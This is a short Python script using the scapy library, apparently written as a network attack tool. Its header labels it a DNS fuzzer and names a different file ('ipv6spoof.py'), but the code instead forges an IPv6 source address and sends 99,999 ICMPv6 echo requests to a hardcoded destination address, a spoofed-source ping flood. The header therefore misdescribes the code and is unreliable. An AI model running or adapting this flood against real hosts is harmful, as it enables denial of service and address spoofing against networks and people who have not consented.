#!/usr/bin/python
#Author : Antonio Taboada
#Date: 10/10/2017
#Filename: dnsfuzz.py
#Purpose : Simple dns fuzz Ejecutar: python ipv6spoof.py IP;
import sys
from scapy.all import *

ipv6 = IPv6(src="2001::1", dst="2a02:9140:3c00:9200:34b3:2576:405e:34ed")/ICMPv6EchoRequest()
send(ipv6,iface="eth0", count=99999)
